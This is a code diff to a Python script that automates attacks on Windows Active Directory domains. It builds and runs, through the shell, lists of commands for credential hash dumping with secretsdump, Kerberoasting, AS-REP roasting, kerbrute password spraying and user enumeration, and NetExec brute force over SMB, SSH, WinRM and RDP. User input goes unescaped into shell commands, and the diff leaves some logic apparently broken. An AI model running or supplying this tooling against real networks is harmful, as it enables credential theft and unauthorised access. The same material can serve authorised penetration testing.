@@ -103,97 +103,85 @@ def log_command(log_file, command, output):
         f.write(f"{'='*50}\n")
         f.write(output)
         f.write("\n")
-
-def run_command(command, log_file, stop_animation):
-    """Execute command and log output"""
-    try:
-        pink = rgb_to_ansi("F686BD")
-        reset = "\033[0m"
-        print(f"\n{pink}[*] Running: {reset}{command}")
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        output, error = process.communicate()
         
-        # Combine stdout and stderr for logging
-        full_output = output + error
-        log_command(log_file, command, full_output)
-        
-        print(f"{pink}[+] Command completed. Output saved to {reset}{log_file}")
-        return True
-    except Exception as e:
-        print(f"{pink}[-] Error executing command: {reset}{e}")
-        log_command(log_file, command, f"Error: {str(e)}")
-        return False
-    finally:
-        stop_animation.set()
-
-def prompt_for_input():
+def run_commands(commands, log_file, stop_animation):
+    """Execute multiple commands and log output"""
     pink = rgb_to_ansi("F686BD")
     reset = "\033[0m"
-    print(f"\n{pink}[*] Please provide the following information, assuming you can even read:{reset}")
     
-    # Required inputs
-    domain = input(f"{pink}Domain (required): {reset}").strip()
-    while not domain:
-        print(f"{pink}Domain is required dumbass!{reset}")
-        domain = input(f"{pink}Domain (required): {reset}").strip()
-    
-    ip = input(f"{pink}IP Address (required): {reset}").strip()
-    while not ip:
-        print(f"{pink}IP Address is required dumbass!{reset}")
-        ip = input(f"{pink}IP Address (required): {reset}").strip()
-    
-    # Optional DC-IP
-    dc_ip = input(f"{pink}DC-IP (optional, press Enter to skip): {reset}").strip()
-    
-    # User authentication
-    print(f"\n{pink}User Authentication (choose one idiot):{reset}")
-    print(f"{pink}1. Single valid username{reset}")
-    print(f"{pink}2. User list file{reset}")
-    user_choice = input(f"{pink}Enter choice (1/2): {reset}").strip()
-    
-    username = None
-    userlist = None
-    while user_choice not in ['1', '2']:
-        user_choice = input(f"{pink}Please enter 1 or 2: {reset}").strip()
-    
-    if user_choice == '1':
-        username = input(f"{pink}Username: {reset}").strip()
-        while not username:
-            username = input(f"{pink}Username cannot be empty: {reset}").strip()
-    else:
-        userlist = input(f"{pink}Path to user list file: {reset}").strip()
-        while not userlist or not os.path.exists(userlist):
-            userlist = input(f"{pink}Please enter a valid file path: {reset}").strip()
-    
-    # Password authentication
-    print(f"\n{pink}Password Authentication (pick one doofus):{reset}")
-    print(f"{pink}1. Single valid password{reset}")
-    print(f"{pink}2. Password list file{reset}")
-    pass_choice = input(f"{pink}Enter choice (1/2): {reset}").strip()
-    
-    password = None
-    passwordlist = None
-    while pass_choice not in ['1', '2']:
-        pass_choice = input(f"{pink}Please enter 1 or 2: {reset}").strip()
-    
-    if pass_choice == '1':
-        password = input(f"{pink}Password: {reset}").strip()
-        while not password:
-            password = input(f"{pink}Password cannot be empty: {reset}").strip()
-    else:
-        passwordlist = input(f"{pink}Path to password list file: {reset}").strip()
-        while not passwordlist or not os.path.exists(passwordlist):
-            passwordlist = input(f"{pink}Please enter a valid file path: {reset}").strip()
-    
-    return {
-        'domain': domain,
-        'ip': ip,
-        'dc_ip': dc_ip,
-        'username': username,
-        'userlist': userlist,
-        'password': password,
-        'passwordlist': passwordlist
-    }
+    for command in commands:
+        try:
+            print(f"\n{pink}[*] Running: {reset}{command}")
+            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+            output, error = process.communicate()
+            
+            # Combine stdout and stderr for logging
+            full_output = output + error
+            log_command(log_file, command, full_output)
+            
+            print(f"{pink}[+] Command completed.{reset}")
+        except Exception as e:
+            print(f"{pink}[-] Error executing command: {reset}{e}")
+            log_command(log_file, command, f"Error: {str(e)}")
+            continue
+
+def get_scenario_1_commands(inputs):
+    """Commands for single username and password"""
+    return [
+        f"bloodhound-python -u {inputs['username']} -p '{inputs['password']}' -ns {inputs['ip']} -d {inputs['domain']} -c all",
+        f"enum4linux -u \"{inputs['username']}\" -p \"{inputs['password']}\" -a {inputs['ip']}",
+        f"impacket-secretsdump {inputs['domain']}/{inputs['username']}:'{inputs['password']}'@{inputs['ip']}",
+        f"impacket-GetUserSPNs {inputs['domain']}/{inputs['username']}:'{inputs['password']}' -dc-ip {inputs['dc_ip'] or inputs['ip']}",
+        f"impacket-GetNPUsers {inputs['domain']}/{inputs['username']}:'{inputs['password']}' -dc-ip {inputs['dc_ip'] or inputs['ip']}",
+        f"impacket-rpcdump {inputs['domain']}/{inputs['username']}:{inputs['password']}@{inputs['ip']}",
+        f"ldapdomaindump -u {inputs['domain']}\\\\{inputs['username']} -p '{inputs['password']}' {inputs['domain']} -o ldapdomaindump",
+        f"nxc ldap {inputs['ip']} -u {inputs['username']} -p {inputs['password']} --kdcHost {inputs['ip']} -M laps",
+        f"nxc smb {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
+        f"nxc ssh {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
+        f"nxc winrm {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']}",
+        f"nxc rdp {inputs['ip']} -u {inputs['username']} -p '{inputs['password']}' -d {inputs['domain']} --rdp-timeout 30",
+        f"smbclient -L //{inputs['ip']}/ -U {inputs['username']}%{inputs['password']}"
+    ]
+
+def get_scenario_2_commands(inputs):
+    """Commands for single username with password list"""
+    return [
+        f"enum4linux -a {inputs['ip']}",
+        f"kerbrute bruteuser -d {inputs['domain']} {inputs['passwordlist']} {inputs['username']}",
+        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
+        f"nxc smb {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
+        f"nxc ssh {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
+        f"nxc winrm {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success",
+        f"nxc rdp {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']} -d {inputs['domain']} --continue-on-success --rdp-timeout 30",
+        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -u '{inputs['username']}' -p ''"
+    ]
+
+def get_scenario_3_commands(inputs):
+    """Commands for user list with single password"""
+    return [
+        f"enum4linux -a {inputs['ip']}",
+        f"kerbrute passwordspray -d {inputs['domain']} {inputs['userlist']} {inputs['password']}",
+        f"kerbrute userenum -d {inputs['domain']} {inputs['userlist']}",
+        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
+        f"nxc smb {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
+        f"nxc ssh {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
+        f"nxc winrm {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success",
+        f"nxc rdp {inputs['ip']} -u {inputs['userlist']} -p '{inputs['password']}' -d {inputs['domain']} --continue-on-success --rdp-timeout 30",
+        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -N"
+    ]
+
+def get_scenario_4_commands(inputs):
+    """Commands for user list and password list"""
+    return [
+        f"enum4linux -a {inputs['ip']}",
+        f"kerbrute userenum -d {inputs['domain']} {inputs['userlist']}",
+        f"ldapsearch -LLL -x -H ldap://{inputs['domain']} -b'' -s base '(objectclass=*)'",
+        f"nxc smb {inputs['ip']} -u '' -p '' --shares --users",
+        f"nxc ssh {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']}",
+        f"nxc winrm {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']}",
+        f"nxc rdp {inputs['ip']} -u {inputs['userlist']} -p {inputs['passwordlist']} --rdp-timeout 30",
+        f"smbclient -L \\\\\\\\{inputs['ip']}\\\\ -N"
+    ]
 
 def main():
     print_title()
@@ -210,37 +198,31 @@ def main():
     
     # Determine scenario and run appropriate commands
     if inputs['username'] and inputs['password']:
-        # Scenario 1: Single username and password
         animation_thread = threading.Thread(target=animate, args=(stop_animation,))
         animation_thread.start()
-        
-        command = f"nxc smb {inputs['ip']} -u {inputs['username']} -p {inputs['password']}"
-        run_command(command, log_file, stop_animation)
+        commands = get_scenario_1_commands(inputs)
+        print(f"\n{pink}[*] Running Scenario 1: Single username and password{reset}")
         
     elif inputs['username'] and inputs['passwordlist']:
-        # Scenario 2: Single username with password list
         animation_thread = threading.Thread(target=animate, args=(stop_animation,))
         animation_thread.start()
-        
-        command = f"nxc smb {inputs['ip']} -u {inputs['username']} -p {inputs['passwordlist']}"
-        run_command(command, log_file, stop_animation)
+        commands = get_scenario_2_commands(inputs)
+        print(f"\n{pink}[*] Running Scenario 2: Single username with password list{reset}")
         
     elif inputs['userlist'] and inputs['password']:
-        # Scenario 3: User list with single password
         animation_thread = threading.Thread(target=animate, args=(stop_animation,))
         animation_thread.start()
-        
-        command = f"kerbrute passwordspray -d {inputs['domain']} {inputs['userlist']} {inputs['password']}"
-        run_command(command, log_file, stop_animation)
+        commands = get_scenario_3_commands(inputs)
+        print(f"\n{pink}[*] Running Scenario 3: User list with single password{reset}")
         
     elif inputs['userlist'] and inputs['passwordlist']:
-        # Scenario 4: User list with password list
         animation_thread = threading.Thread(target=animate, args=(stop_animation,))
         animation_thread.start()
-        
-        command = f"kerbrute userenum -d {inputs['domain']} {inputs['userlist']}"
-        run_command(command, log_file, stop_animation)
-    
+        commands = get_scenario_4_commands(inputs)
+        print(f"\n{pink}[*] Running Scenario 4: User list with password list{reset}")
+
+    run_commands(commands, log_file, stop_animation)
+    stop_animation.set()
     print(f"\n{pink}[*] Enumeration completed!{reset}")
 
 if __name__ == "__main__":
